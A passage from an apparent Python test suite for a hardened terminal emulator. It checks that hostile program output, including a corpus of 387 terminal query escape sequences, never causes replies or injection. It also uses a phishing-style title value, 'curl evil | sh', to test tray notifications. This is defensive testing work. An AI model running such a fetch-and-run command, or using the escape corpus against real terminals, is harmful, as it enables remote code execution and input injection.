eq(len(_cor), 2, 'OSC 52 read: allow-once does not remember -> the next read re-asks')
_co.close()

# allow-always: answers and remembers -> the next read replies with no new dialog
_ca, _car, _cas = _clip_term()
_clip_ask(_ca)
_ca.grant_clipboard_read(_ca.CLIP_ALLOW_ALWAYS)
_clip_ask(_ca)
eq(len(_car), 1, 'OSC 52 read: allow-always is remembered -> no second dialog')
eq(len(_cas), 2, 'OSC 52 read: allow-always answers subsequent reads directly')
_ca.close()

# deny-once: no reply, and the next read re-asks
_do, _dor, _dos = _clip_term()
_clip_ask(_do)
_do.grant_clipboard_read(_do.CLIP_DENY_ONCE)
eq(_dos, [], 'OSC 52 read: deny-once sends no reply')
_clip_ask(_do)
eq(len(_dor), 2, 'OSC 52 read: deny-once does not remember -> the next read re-asks')
_do.close()

# deny-always: no reply, no re-ask
_da, _dar, _das = _clip_term()
_clip_ask(_da)
_da.grant_clipboard_read(_da.CLIP_DENY_ALWAYS)
_clip_ask(_da)
eq(_das, [], 'OSC 52 read: deny-always sends no reply')
eq(len(_dar), 1, 'OSC 52 read: deny-always is remembered -> no re-ask')
_da.close()

# global always-allow: an undecided tab auto-answers with NO dialog...
_ga, _gar, _gas = _clip_term()
_ga.set_clipboard_read_always(True)
_clip_ask(_ga)
eq(len(_gar), 0, 'OSC 52 read: global always-allow answers WITHOUT a dialog')
ok(len(_gas) == 1 and _gas[0].startswith(b'\x1b]52;c;'),
   'OSC 52 read: global always-allow replies to an undecided tab')
# ...but an explicit per-tab Deny still wins over the global default. Global always-allow
# answers with NO dialog, so no 'pending' is ever raised for grant to resolve -- the
# standing per-tab deny is the persisted state (False), read directly.
_ga._clipboard_read = False
_gas.clear()
_clip_ask(_ga)
eq(_gas, [], 'OSC 52 read: a per-tab Deny wins over global always-allow')
_ga.close()
# CLI-mode notice distinguishes an OSC 52 READ query from a WRITE (shared code 52)
_cn = SecureTerminal(command='/bin/cat')   # CLI mode
_nk = []
_cn.osc_used.connect(lambda k: _nk.append(k))
feed_output(_cn, b'\x1b]52;c;?\x07')       # read query
ok('osc_clipboard_read' in _nk, 'CLI OSC 52 read query is notified as clipboard_read')
_nk.clear()
feed_output(_cn, b'\x1b]52;c;aGk=\x07')    # write
ok('osc_clipboard' in _nk and 'osc_clipboard_read' not in _nk,
   'CLI OSC 52 write is notified as clipboard (write), not read')
_cn.close()

# --- reflection oracle: output must NEVER cause a write to the pty ------------
# The crown-jewel invariant. A crafted file cat'd to the terminal, or hostile
# program output, can emit a capability QUERY (DA/DSR/CPR/XTVERSION/DECRQM/
# XTGETTCAP/DECRQSS/kitty-?u/OSC color+clipboard read/ENQ). A terminal that
# ANSWERS reflects the reply into the foreground program's stdin -- a 20-year
# "output becomes input" injection class. secure-terminal answers NONE of them,
# in either mode, because nothing on the output path writes to the pty. Feed the
# whole battery through the real _on_readable and assert the write-spy stays empty.
def _spec_surface_corpus():
    """The reflection/query spec surface expanded to its real breadth: every
    DISTINCT sequence a terminal could be asked to REPLY to (each a documented
    query, not padding). Covers DA1/DA2/DA3 + DECID, DSR (ANSI + DEC-private),
    DECRQM for the documented ANSI and DEC-private modes, OSC dynamic-colour
    queries for all 256 palette indices + the special colour slots, OSC 52
    clipboard READ per selection, XTGETTCAP for the standard terminfo cap set,
    DECRQSS status-string requests, XTWINOPS report requests, XTVERSION, the kitty
    keyboard query and ENQ. secure-terminal answers NONE of them in either mode."""
    seq = []
    seq += [b'\x1b[c', b'\x1b[0c', b'\x1b[>c', b'\x1b[>0c', b'\x1b[=c',
            b'\x1b[=0c', b'\x1bZ']              # DA1/DA2/DA3 + DECID
    for _n in (5, 6, 15, 25, 26, 53, 55, 56, 62, 63, 75, 85):
        seq.append(b'\x1b[%dn' % _n)           # DSR (ANSI)
        seq.append(b'\x1b[?%dn' % _n)          # DSR (DEC-private)
    for _m in (2, 4, 12, 20):
        seq.append(b'\x1b[%d$p' % _m)          # DECRQM (ANSI modes)
    for _m in (1, 3, 5, 6, 7, 8, 9, 12, 25, 45, 47, 66, 67, 69, 1000, 1001,
               1002, 1003, 1004, 1005, 1006, 1007, 1015, 1016, 1034, 1047,
               1048, 1049, 2004, 2026, 2027, 2031, 9001):
        seq.append(b'\x1b[?%d$p' % _m)         # DECRQM (DEC-private modes)
    for _n in range(256):
        seq.append(b'\x1b]4;%d;?\x07' % _n)    # OSC 4 palette query, every index
    for _n in range(10, 20):
        seq.append(b'\x1b]%d;?\x07' % _n)      # OSC 10-19 special colour slots
    for _sel in (b'c', b'p', b's', b'0', b'7'):
        seq.append(b'\x1b]52;' + _sel + b';?\x07')   # OSC 52 clipboard READ
    for _cap in ('Co', 'RGB', 'TN', 'name', 'bce', 'colors', 'cr', 'kbs', 'kDC',
                 'kEND', 'kHOM', 'kLFT', 'kNXT', 'kPRV', 'kRIT', 'khome', 'kend',
                 'smcup', 'rmcup', 'smkx', 'rmkx', 'Se', 'Ss', 'Cr', 'Cs', 'u6',
                 'u7', 'u8', 'u9'):
        seq.append(b'\x1bP+q' + _cap.encode().hex().encode() + b'\x1b\\')  # XTGETTCAP
    for _s in (b'm', b'r', b's', b'"q', b'"p', b' q', b't', b'$}', b'$~'):
        seq.append(b'\x1bP$q' + _s + b'\x1b\\')      # DECRQSS status-string request
    for _t in (11, 13, 14, 18, 19, 20, 21):
        seq.append(b'\x1b[%dt' % _t)           # XTWINOPS size/position/title reports
    seq += [b'\x1b[>q', b'\x1b[?u', b'\x05']    # XTVERSION, kitty query, ENQ
    return list(dict.fromkeys(seq))            # distinct, order-preserving


_QUERIES = _spec_surface_corpus()


for _label, _mk in (('CLI', lambda: SecureTerminal(command='/bin/cat')),
                    ('TUI', lambda: SecureTerminal(command='/bin/cat', tui=True))):
    _ro = _mk()
    if _label == 'TUI':
        for _k in (f[0] for f in _S.OSC_FEATURES):
            _ro.apply_osc(_k, True)        # even every OSC feature ENABLED must not reply
    _rosent = spy_writes(_ro)
    for _q in _QUERIES:
        feed_output(_ro, _q)
    ok(_rosent == [],
       'reflection oracle (%s): none of the %d spec-surface queries is answered '
       'back to the pty (got %r)' % (_label, len(_QUERIES), _rosent))
    if _label == 'CLI':
        ok(_ro._screen is None,           # pylint: disable=protected-access
           'reflection oracle (CLI): the pyte screen is never instantiated '
           '(no VT state to attack)')
    # Even if pyte itself tried to reply, our screen never wires the channel:
    if _ro._screen is not None:            # pylint: disable=protected-access
        _ro._screen.write_process_input('should-go-nowhere')
        ok(_rosent == [], 'reflection oracle (%s): pyte write_process_input reaches no pty'
           % _label)
    _ro.close()

# lock the corpus size so the "N spec-surface sequences" figure on the site and the
# test cannot silently drift apart (compatibility + ai-review pages cite this count)
ok(len(_QUERIES) == 387,
   'the reflection spec-surface corpus is 387 distinct query sequences (got %d)'
   % len(_QUERIES))

# --- graphics payloads (sixel DCS, kitty APC, iTerm2 1337): stripped, no reply -
# a cat'd image is a huge DCS/APC/OSC string; CLI shows no image and answers nothing
_gfx = SecureTerminal(command='/bin/cat')
_gfxsent = spy_writes(_gfx)
feed_output(_gfx, b'before\x1bP0;0;0q#0;2;0;0;0#0~~@@vv@@~~$-#1?}}GG}}?-\x1b\\after\n')
feed_output(_gfx, b'k\x1b_Gf=32,s=1,v=1,c=1,r=1;AAAA\x1b\\g\n')   # kitty graphics
feed_output(_gfx, b'i\x1b]1337;File=inline=1:AAAA\x07j\n')        # iTerm2 inline image
_gfxdoc = _gfx.toPlainText()
ok('\x1b' not in _gfxdoc, 'graphics payloads leave no escape byte in the document')
ok('before' in _gfxdoc and 'after' in _gfxdoc,
   'text around a sixel image survives; the image DCS body is dropped')
ok('#0;2' not in _gfxdoc and 'Gf=32' not in _gfxdoc and 'File=inline' not in _gfxdoc,
   'no sixel/kitty/iTerm2 image data is rendered as text')
ok(_gfxsent == [], 'a graphics payload triggers no reply to the pty')
_gfx.close()

# --- mouse-reporting oracle: OUTPUT never fabricates input; only real user events ---
# secure-terminal now IMPLEMENTS mouse reporting (konsole/xterm parity -- see the
# parity block above), so unlike its earlier stance it DOES answer real mouse/focus
# events with ESC[<...M/m reports when the program asked for them. The security
# property that REMAINS -- and the one this oracle guards -- is that a program's
# OUTPUT cannot itself cause a write: enabling every mouse mode writes nothing back,
# and Shift keeps a real event LOCAL. This is the updated terminal-poc-corpus
# 'mouse-tracking-reflection' expectation for this terminal (reporting is a feature;
# the invariant is output-cannot-inject).
from PyQt6.QtGui import QFocusEvent as _QFE            # noqa: E402
_mf = SecureTerminal(command='/bin/cat', tui=True)
_mfsent = spy_writes(_mf)
# Output that enables EVERY mouse mode + the alt screen writes NOTHING back by itself.
feed_output(_mf, b'\x1b[?1000h\x1b[?1002h\x1b[?1003h\x1b[?1006h\x1b[?1004h\x1b[?1049h')
ok(_mfsent == [], 'enabling mouse modes from OUTPUT writes nothing back (no reflection)')
_mflb = Qt.MouseButton.LeftButton
_mfnb = Qt.MouseButton.NoButton
_mfnm = Qt.KeyboardModifier.NoModifier
_mfsh = Qt.KeyboardModifier.ShiftModifier
# A real user press IS reported now (the feature).
_mf.mousePressEvent(QMouseEvent(QEvent.Type.MouseButtonPress, QPointF(9, 9),
                                QPointF(9, 9), _mflb, _mflb, _mfnm))
ok(_mfsent and _mfsent[-1].startswith(b'\x1b[<') and _mfsent[-1].endswith(b'M'),
   'a real user press IS reported to the child (mouse-reporting parity)')
_mf.mouseReleaseEvent(QMouseEvent(QEvent.Type.MouseButtonRelease, QPointF(9, 9),
                                  QPointF(9, 9), _mflb, _mfnb, _mfnm))
# Shift keeps a real event LOCAL -- the override holds, no report reaches the child.
_mfsent.clear()
_mf.mousePressEvent(QMouseEvent(QEvent.Type.MouseButtonPress, QPointF(9, 9),
                                QPointF(9, 9), _mflb, _mflb, _mfsh))
ok(_mfsent == [], 'Shift+press stays local -- no report (the local override holds)')
_mf.mouseReleaseEvent(QMouseEvent(QEvent.Type.MouseButtonRelease, QPointF(9, 9),
                                  QPointF(9, 9), _mflb, _mfnb, _mfsh))
# POSITIVE CONTROL: the spy is wired to the one choke point (_write); a synthetic
# report pushed through it MUST be caught, proving the observations above are real.
_mfsent.clear()
_mf._write(b'\x1b[<0;12;6M')                          # pylint: disable=protected-access
ok(_mfsent == [b'\x1b[<0;12;6M'],
   'positive control: a report through _write is observed (the spy is live)')
_mf.close()

# --- synchronized-output DoS: a never-closed ESC[?2026h must self-release -------
# A program that opens a synchronized update (DECSET private mode 2026) and never
# sends the closing ESC[?2026l would freeze the display forever if the terminal
# held the frame unconditionally. secure-terminal bounds the hold with a 150ms
# watchdog: the frame is painted even when the close never arrives, so output-driven
# DoS cannot wedge the widget. This is the WIDGET-level observable -- the corpus
# denial-of-service oracle measures the Qt-free render() path only, never the
# sync-update hold, which is a live-widget timer.
_sy = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_sy, b'\x1b[?2026h')                 # open a sync update, never close it
feed_output(_sy, b'held-frame-content\n')        # painted only when the hold releases
ok(_sy._sync_update, 'ESC[?2026h opens a synchronized-update hold')      # noqa: protected-access
pump(230)                                        # > the 150ms watchdog bound
ok(not _sy._sync_update,
   'a never-closed synchronized update self-releases within the 150ms watchdog '
   '(no output-driven display freeze)')
ok('held-frame-content' in _sy.toPlainText(),
   'the held frame is painted once the sync watchdog fires')
_sy.close()

# ADVERSARIAL reflection oracle: a hostile file/program does not just emit a
# query -- it can ALSO emit output that tries to OPEN a reply first (fake the
# alternate screen with ESC[?1049h, begin a synchronized update), and the shell
# may be at a readline prompt (pty non-canonical, ICANON off). NONE of these
# output-induced states, alone or combined, may open ANY write-back. This is the
# property that would have caught the alt-screen and raw-mode gate defeats before
# external review: feed every query PREFIXED with each state-faking sequence and
# assert the write-spy stays empty.
import termios as _tio_adv                                         # noqa: E402
_ADV_PREFIXES = [b'', b'\x1b[?1049h', b'\x1b[?1047h', b'\x1b[?47h', b'\x1b[?2026h',
                 b'\x1b[?1049h\x1b[?2026h']
_adv = SecureTerminal(command='/bin/cat', tui=True)
for _k in (f[0] for f in _S.OSC_FEATURES):
    _adv.apply_osc(_k, True)               # every OSC feature enabled
_aa = _tio_adv.tcgetattr(_adv._fd)         # + the readline-prompt case (ICANON off)
_aa[3] &= ~_tio_adv.ICANON
_tio_adv.tcsetattr(_adv._fd, _tio_adv.TCSANOW, _aa)
_advsent = spy_writes(_adv)
for _pfx in _ADV_PREFIXES:
    for _q in _QUERIES:
        feed_output(_adv, _pfx + _q)
ok(_advsent == [],
   'reflection oracle (adversarial): output that fakes alt-screen / sync while at '
   'a readline prompt still elicits ZERO write-back (got %r)' % _advsent[:3])
_adv.close()

# --- bell (BEL) policy --------------------------------------------------------
# A standalone BEL in output rings per the tab's policy (off/audible/visual),
# off by default (BEL from untrusted output is a nuisance surface), and is
# rate-limited so a BEL flood cannot machine-gun it. An OSC-terminating BEL is
# not a bell. The BEL itself stays neutralized in the display either way.
import secure_terminal.terminal as _stmod    # noqa: E402


class _FakeApp:
    def __init__(self):
        self.beeps = 0
        self.alerts = 0

    def beep(self):
        self.beeps += 1

    def alert(self, _win, _msec):
        self.alerts += 1


class _QAppShim:
    _fake = _FakeApp()

    @staticmethod
    def instance():
        return _QAppShim._fake


_be = SecureTerminal(command='/bin/cat')
eq(_be.bell_channels(), set(), 'bell defaults to silent (no channels)')
_be.apply_bell('audible')
eq(_be.bell_channels(), {'audible'}, 'apply_bell enables a channel')
_be.apply_bell('audible,visual,tray')
eq(_be.bell_channels(), {'audible', 'visual', 'tray'}, 'channels are non-exclusive')
_be.apply_bell({'visual'})                         # a set spec is accepted too
eq(_be.bell_channels(), {'visual'}, 'apply_bell accepts a set')
_be.apply_bell('bogus,off')
eq(_be.bell_channels(), set(), 'unknown/legacy-off tokens yield no channels')

_orig_qapp = _stmod.QApplication
_stmod.QApplication = _QAppShim
try:
    fake = _QAppShim._fake
    _be.apply_bell('audible')
    feed_output(_be, b'ding\x07more\x07')          # two BELs in one burst
    eq(fake.beeps, 1, 'a BEL burst rings once (rate-limited)')
    fake.beeps = 0
    feed_output(_be, b'\x1b]0;a title\x07')        # OSC terminator, not a bell
    eq(fake.beeps, 0, 'an OSC-terminating BEL does not ring')
    _be.apply_bell('off')
    feed_output(_be, b'x\x07y')
    eq(fake.beeps, 0, 'silent bell does not ring')
    _be.apply_bell('visual')
    _be._last_bell = 0.0                           # clear the rate-limit gate
    feed_output(_be, b'attn\x07')
    eq(fake.alerts, 1, 'visual channel raises a window urgency alert')
    # non-exclusive: audible + visual together fire BOTH on one bell
    fake.beeps = 0
    fake.alerts = 0
    _be.apply_bell('audible,visual')
    _be._last_bell = 0.0
    feed_output(_be, b'both\x07')
    eq((fake.beeps, fake.alerts), (1, 1), 'audible+visual both fire on one bell')
    # tray channel emits the bell_tray signal (the window shows the popup)
    _trays = []
    _be.bell_tray.connect(lambda label: _trays.append(label))
    _be.apply_bell('tray')
    _be._last_bell = 0.0
    feed_output(_be, b'ping\x07')
    eq(len(_trays), 1, 'tray channel emits a bell_tray notification')
    # a shell OSC title (BEL-terminated) split across two reads must NOT false-ring:
    # the BEL is the OSC terminator, consumed by the carry, not a standalone bell
    fake.beeps = 0
    _be.apply_bell('audible')
    _be._last_bell = 0.0
    feed_output(_be, b'\x1b]0;host: ~/dir')        # OSC title, no terminator yet
    feed_output(_be, b'\x07$ ')                    # its BEL terminator next read
    eq(fake.beeps, 0, 'a shell OSC title split across reads does not false-ring the bell')
finally:
    _stmod.QApplication = _orig_qapp
_be.close()

# bell sound file is accepted only inside an allowed folder (AppArmor-enforceable)
from secure_terminal.terminal import sound_file_allowed as _sfa, BELL_SOUND_DIRS as _bsd  # noqa: E402
ok(not _sfa('/etc/passwd'), 'a sound file outside the allowed folders is rejected')
ok(not _sfa(''), 'an empty sound path is rejected')
_sound_ok = None
for _d in _bsd:
    if os.path.isdir(_d):
        for _root, _dirs, _files in os.walk(_d):
            _snd = [f for f in _files if f.endswith(('.wav', '.ogg', '.oga'))]
            if _snd:
                _sound_ok = os.path.join(_root, _snd[0])
                break
    if _sound_ok:
        break
if _sound_ok:
    ok(_sfa(_sound_ok), 'a sound file inside an allowed folder is accepted (%s)' % _sound_ok)

# a malformed persisted bell spec (corrupt session) never raises -> no channels
eq(SecureTerminal._parse_bell(123), set(), 'a non-iterable bell spec yields no channels')
eq(SecureTerminal._parse_bell([None, 'audible', 5]), {'audible'},
   'a list with non-string elements is filtered, not fatal')
eq(SecureTerminal._parse_bell({'visual', 'nope'}), {'visual'},
   'an unknown channel in a set is dropped')

# toggling one channel preserves the current tab's OTHER channels (codex F2)
_bt = SecureTerminal(command='/bin/cat')
win.tabs.addTab(_bt, 'bell-preserve')
win.tabs.setCurrentWidget(_bt)
_bt.apply_bell({'visual'})
win._default_bell = set()                         # make the tab differ from default
win.set_bell_channel('tray', True)
eq(_bt.bell_channels(), {'visual', 'tray'},
   'toggling one channel keeps the current tab other channels')
eq(win._default_bell, {'tray'}, 'the global default tracks the toggled channel')
win.tabs.removeTab(win.tabs.indexOf(_bt))
_bt.close()

# a bell_sound admin lock refuses the sound setter
_saved_l2 = win._locked
win._locked = set(win._locked) | {'bell_sound'}
win._default_bell_sound = ''
win.set_bell_sound('/usr/share/sounds/anything.wav')
eq(win._default_bell_sound, '', 'a bell_sound lock refuses set_bell_sound')
win._locked = _saved_l2

# switching modes clears a pending CLI discard state, or output after the switch
# back would be swallowed until a stray terminator (codex F2)
if tui_available():
    _bd = SecureTerminal(command='/bin/cat')
    _bd._esc_drop = 'P'
    _bd._esc_dropped = 1234
    _bd._esc_notified = True
    _bd.apply_tui(True)
    eq((_bd._esc_drop, _bd._esc_dropped, _bd._esc_notified), ('', 0, False),
       'switching to TUI clears a pending CLI discard state, its counter and its notice flag')
    _bd.close()

# an over-cap OSC (introducer truncated by the discard) still surfaces an OSC-use
# notice, so padding an OSC past the cap cannot evade the once-per-type banner (F5)
_bo = SecureTerminal(command='/bin/cat')
_osc_seen = []
_bo.osc_used.connect(lambda k: _osc_seen.append(k))
feed_output(_bo, b'\x1b]0;' + b'A' * 5000)         # >cap OSC, no terminator -> discard
ok('osc_other' in _osc_seen, 'an over-cap OSC still surfaces an OSC-use notice')
_bo.close()

# escape_limit: an unterminated OSC/DCS string sequence makes CLI mode discard all
# following output (safe -- no escape byte is ever rendered) but it looks like a
# freeze. The suppression is NEVER lifted; instead a one-time notice fires past the
# threshold. Pure function first (the discard keeps suppressing + counts), then the
# live widget's escape_suppressed signal.
from secure_terminal.sanitize import feed_chunk_carry           # noqa: E402
_ES = '\x1b]' + 'A' * 5000                          # over-cap incomplete OSC (no BEL/ST)
# entering the discard state records the characters suppressed so far
eq(feed_chunk_carry(_ES, '', '', 0), ('', '', ']', len(_ES)),
   'feed_chunk_carry: an over-cap incomplete OSC enters the discard state, counting suppressed chars')
# the discard keeps suppressing across chunks; the counter accumulates (never resumes)
eq(feed_chunk_carry('B' * 100, '', ']', len(_ES)), ('', '', ']', len(_ES) + 100),
   'feed_chunk_carry: the discard keeps suppressing and accumulating, never rendering the bytes')
# a real terminator ends the sequence, resets the counter, and renders the tail after it
eq(feed_chunk_carry('done\x07after', '', ']', len(_ES)), ('after', '', '', 0),
   'feed_chunk_carry: a terminator ends the sequence and resets the discard counter')
# a lone trailing ESC in the discard state is held as a possible split ST terminator
eq(feed_chunk_carry('data\x1b', '', 'P', 10), ('', '\x1b', 'P', 15),
   'feed_chunk_carry: a trailing ESC is carried as a possible split ST')

# live widget: the escape_suppressed signal fires ONCE past the threshold; the
# output stays suppressed (nothing is rendered) either way.
_eln = SecureTerminal(command='/bin/cat', tui=False)
_eln.apply_escape_limit(4096)
_fired = []
_eln.escape_suppressed.connect(lambda: _fired.append(1))
feed_output(_eln, b'\x1b]0;' + b'A' * 5000)         # over-cap unterminated OSC -> past the threshold
eq(len(_fired), 1, 'escape_suppressed fires once when suppression passes the threshold')
feed_output(_eln, b'B' * 5000)                      # still no terminator, same run
eq(len(_fired), 1, 'escape_suppressed does not re-fire within one discard run')
ok('AAAA' not in _eln.transcript_text() and 'BBBB' not in _eln.transcript_text(),
   'the suppressed output is never rendered (no escape byte leaks as text)')
feed_output(_eln, b'\x07')                          # terminator ends the sequence (re-arm)
feed_output(_eln, b'\x1b]0;' + b'C' * 5000)         # a NEW unterminated sequence re-fires
eq(len(_fired), 2, 'escape_suppressed re-arms and re-fires after the sequence ends')
_eln.close()
# escape_limit=0 never notifies, but still suppresses; a negative clamps to 0.
_el0 = SecureTerminal(command='/bin/cat', tui=False)
_el0.apply_escape_limit(-5)
eq(_el0.current_escape_limit(), 0, 'apply_escape_limit clamps a negative threshold to 0')
_fired0 = []
_el0.escape_suppressed.connect(lambda: _fired0.append(1))
feed_output(_el0, b'\x1b]0;' + b'A' * 5000)
feed_output(_el0, b'B' * 5000)
eq(len(_fired0), 0, 'escape_limit=0: never notifies')
ok('BBBB' not in _el0.transcript_text(), 'escape_limit=0 still suppresses the output')
_el0.close()

# --- system tray: opt-in, default off, no untrusted output on the tray --------
# Offscreen has no real tray, so exercise the gating/persist logic and the
# deception-safe notification text directly (injecting a fake tray object).
eq(win._systray, False, 'systray is opt-in: default off')
eq(win.act_systray.isChecked(), False, 'systray menu action reflects the default (off)')
ok(not win._bell_actions['tray'].isEnabled(),
   "the 'Tray popup' bell channel is greyed out while the tray is off")

# Offscreen has NO system tray, so enabling must fail closed: revert to off and
# leave the 'tray' bell channel greyed, never present the feature as active.
win._tray = None
win.set_systray(True)
ok(not win._systray and not win.act_systray.isChecked(),
   'set_systray(True) reverts when no system tray is available')
ok(not win._bell_actions['tray'].isEnabled(),
   'the tray bell channel stays greyed when no tray is available')


class _FakeTray:                                       # captures showMessage bodies
    def __init__(self):
        self.bodies = []

    def showMessage(self, _title, body, *_a):
        self.bodies.append(body)

    def hide(self):
        pass

# With a tray available (faked), enabling really enables and un-greys the channel.
from PyQt6.QtWidgets import QSystemTrayIcon as _QSTI                # noqa: E402
_orig_avail = _QSTI.isSystemTrayAvailable
_QSTI.isSystemTrayAvailable = staticmethod(lambda: True)
try:
    win._tray = _FakeTray()          # so _tray_icon() returns it, no real construction
    win.set_systray(True)
    ok(win._systray and win.act_systray.isChecked(),
       'set_systray(True) enables the tray when one is available')
    ok(win._bell_actions['tray'].isEnabled(),
       "enabling the tray un-greys the 'Tray popup' bell channel")
    win.set_systray(False)
    ok(not win._systray and not win._bell_actions['tray'].isEnabled(),
       'set_systray(False) disables the tray and re-greys the bell channel')

    # admin lock: a locked systray key makes the toggle a no-op
    _saved_locked = win._locked
    win._locked = frozenset({'systray'})
    win.set_systray(True)
    ok(not win._systray, 'a systray admin lock makes set_systray a no-op')
    win._locked = _saved_locked
finally:
    _QSTI.isSystemTrayAvailable = _orig_avail

# _restore_window preserves maximized / full-screen, clearing only 'minimized' --
# restoring from the tray must not shrink a maximized window.
win.setWindowState(Qt.WindowState.WindowMaximized | Qt.WindowState.WindowMinimized)
win._restore_window()
_wstate = win.windowState()
ok(not (_wstate & Qt.WindowState.WindowMinimized),
   '_restore_window clears the minimized bit')
ok(bool(_wstate & Qt.WindowState.WindowMaximized),
   '_restore_window preserves the maximized state (no shrink on restore)')
win.setWindowState(Qt.WindowState.WindowNoState)

# The tray bell notification must carry NO program-set title -- that would put
# attacker-controlled text on an out-of-grid, trusted-looking surface (phishing).
win._systray = True
win._tray = _FakeTray()
_evil = 'Session expired -- run: curl evil | sh'
_tterm = win.tabs.widget(0)
win._user_titles.pop(_tterm, None)
win._on_bell_tray(_tterm, _evil)
ok(win._tray.bodies and _evil not in win._tray.bodies[-1],
   'tray bell body never contains the program-set title')
ok(win._tray.bodies and win._tray.bodies[-1].startswith('Bell in '),
   'tray bell body is a generic trusted locator when the tab is unnamed')
win._user_titles[_tterm] = 'my-build'
win._on_bell_tray(_tterm, _evil)
ok('my-build' in win._tray.bodies[-1] and _evil not in win._tray.bodies[-1],
   'tray bell uses the user-set tab name, never the program title')
win._user_titles.pop(_tterm, None)
win._systray = False
win._tray = None

# --- --test-canary: the EICAR-style positive control -------------------------
# secure-terminal is secure by construction, so an adversarial corpus test sees
# our canary NEVER fire -- indistinguishable from a broken harness that fires
# nothing. `--test-canary` makes us deliberately perform the safe canary action
# so the harness can prove it can SEE a fired canary before trusting any run. The
# marker goes to a single PREDEFINED, owner-only path (never a caller-supplied
# one) so the write can never be aimed elsewhere and AppArmor can confine it.
# Here we verify the control: token on stdout, marker in the predefined dir,
# fail-loud when that dir is unusable, benign token.
import subprocess as _sp                                        # noqa: E402
from secure_terminal.main import canary_marker_path as _canary_marker_path  # noqa: E402

# Fixed protocol constant; MUST match secure_terminal.main.CANARY_TOKEN. Asserted
# by value (not imported) so token drift breaks the corpus/terminal contract loud.
_CANARY_TOKEN = 'SECURE-TERMINAL-TEST-CANARY-POSITIVE-CONTROL-V1'


def _run_canary(env_extra=None, timeout=30, argv_tail=('--test-canary',)):
    code = ('import sys\n'
            'sys.argv = %r\n'
            'from secure_terminal.main import main\n'
            'sys.exit(main())\n' % (['secure-terminal', *argv_tail],))
    env = dict(os.environ, PYTHONPATH=os.pathsep.join(sys.path))
    if env_extra:
        env.update(env_extra)
    # This suite sets SIGCHLD=SIG_IGN so Qt terminal shells auto-reap; that also
    # makes the kernel reap THIS child before subprocess can collect its status,
    # zeroing the exit code. Restore default handling just for the wait so the
    # fail-loud exit code (the canary's whole point) is observed faithfully.
    _prev = signal.signal(signal.SIGCHLD, signal.SIG_DFL)
    try:
        proc = _sp.run([sys.executable, '-c', code], env=env,
                       stdin=_sp.DEVNULL, stdout=_sp.PIPE, stderr=_sp.PIPE,
                       timeout=timeout)
    finally:
        signal.signal(signal.SIGCHLD, _prev)
    return (proc.stdout.decode('utf-8', 'replace'),
            proc.stderr.decode('utf-8', 'replace'), proc.returncode)


def _marker_under(runtime_dir):
    """The predefined marker path for a given runtime dir, via the real resolver
    (no path duplicated in the test)."""
    _saved = os.environ.get('XDG_RUNTIME_DIR')
    os.environ['XDG_RUNTIME_DIR'] = runtime_dir
    try:
        return _canary_marker_path()
    finally:
        if _saved is None:
            os.environ.pop('XDG_RUNTIME_DIR', None)
        else:
            os.environ['XDG_RUNTIME_DIR'] = _saved

# Fires: token on stdout AND written to the predefined, owner-only marker.
_crt = tempfile.mkdtemp(prefix='st-canary-run-')
_cout, _cerr, _crc = _run_canary({'XDG_RUNTIME_DIR': _crt})
_marker = _marker_under(_crt)
_cwrote = ''
if os.path.exists(_marker):
    with open(_marker, encoding='ascii') as _cfh:
        _cwrote = _cfh.read()
ok(_CANARY_TOKEN in _cout and _crc == 0,
   '--test-canary: fires the token on stdout and exits 0')
ok(_CANARY_TOKEN in _cwrote,
   '--test-canary: writes the token to the predefined marker dir')
# The marker is confined to the predefined runtime subtree, not an arbitrary path.
ok(_marker.startswith(os.path.join(_crt, 'secure-terminal', 'canary') + os.sep),
   '--test-canary: marker lives under the predefined <runtime>/secure-terminal/canary/')

# An unusable predefined dir must FAIL LOUD (exit 1), never silently pretend
# success -- the whole point is that a harness can detect a machinery fault. Force
# it by planting a FILE where the "canary" directory must be created.
_crt2 = tempfile.mkdtemp(prefix='st-canary-blk-')
os.makedirs(os.path.join(_crt2, 'secure-terminal'), exist_ok=True)
with open(os.path.join(_crt2, 'secure-terminal', 'canary'), 'w') as _blk:
    _blk.write('')                       # a file, so makedirs(.../canary/) fails
_cout, _cerr, _crc = _run_canary({'XDG_RUNTIME_DIR': _crt2})
ok(_crc == 1,
   '--test-canary: exits 1 (fails loud) when the predefined marker dir is unusable')

# --test-canary is a GLOBAL option: it must fire even when another global (e.g.
# --new-instance from a wrapper) precedes it, not only as the first token.
_crt3 = tempfile.mkdtemp(prefix='st-canary-glob-')
_cout, _cerr, _crc = _run_canary({'XDG_RUNTIME_DIR': _crt3},
                                 argv_tail=('--new-instance', '--test-canary'))
ok(_CANARY_TOKEN in _cout and _crc == 0,
   '--test-canary: fires when it follows another global option (not first token)')

# The token must be a benign literal -- no ESC, no control chars, no shell
# metacharacters -- so the positive control can never itself harm a tester.
ok(all(32 <= ord(_ch) < 127 for _ch in _CANARY_TOKEN)
   and not (set(_CANARY_TOKEN) & set('\x1b;$`|&<>()')),
   '--test-canary: token is a benign printable-ASCII literal')

# --- bell sound gating + playback ---------------------------------------------
import secure_terminal.terminal as _term          # noqa: E402
import tempfile as _tempfile                       # noqa: E402

ok(not _term.sound_file_allowed(''),
   'sound_file_allowed: empty path is rejected')
ok(not _term.sound_file_allowed('/no/such/sound.wav'),
   'sound_file_allowed: a missing file is rejected')
_snd_tmp = _tempfile.mkdtemp()
_outside = os.path.join(_snd_tmp, 'outside.wav')
with open(_outside, 'wb') as _h:
    _h.write(b'RIFF')
ok(not _term.sound_file_allowed(_outside),
   'sound_file_allowed: a file outside the allowed dirs is rejected')
# with the allowed-dirs list pointed at our temp dir, a file inside is accepted
_orig_dirs = _term.BELL_SOUND_DIRS
_term.BELL_SOUND_DIRS = (_snd_tmp,)
try:
    ok(_term.sound_file_allowed(_outside),
       'sound_file_allowed: a real file inside an allowed dir is accepted')
    # _play_sound uses QtMultimedia (a hard dependency); mock QSoundEffect so the
    # real playback path (build the effect, set the source, play, return True) is
    # exercised without needing an audio device in the test environment.
    import types as _types
    _fake_qm = _types.ModuleType('PyQt6.QtMultimedia')

    class _FakeSoundEffect:
        raise_on = None

        def __init__(self, _parent=None):
            if _FakeSoundEffect.raise_on == 'init':
                raise RuntimeError('no audio device')

        def setSource(self, _url):
            pass

        def play(self):
            if _FakeSoundEffect.raise_on == 'play':
                raise RuntimeError('playback failed')

    _fake_qm.QSoundEffect = _FakeSoundEffect
    _o_qm = sys.modules.get('PyQt6.QtMultimedia')
    sys.modules['PyQt6.QtMultimedia'] = _fake_qm
    try:
        _bell = SecureTerminal(command='/bin/cat')
